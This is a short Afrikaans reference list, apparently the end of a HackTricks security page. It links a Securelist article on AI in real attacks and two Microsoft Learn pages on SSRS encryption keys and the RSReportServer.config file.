- [13] [CyberStrikeAI in die natuur: die gebruik van AI in werklike aanvalle op organisasies](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - Berging van geënkripteerde Report Server-data](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - RSReportServer.config-konfigurasielêer](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
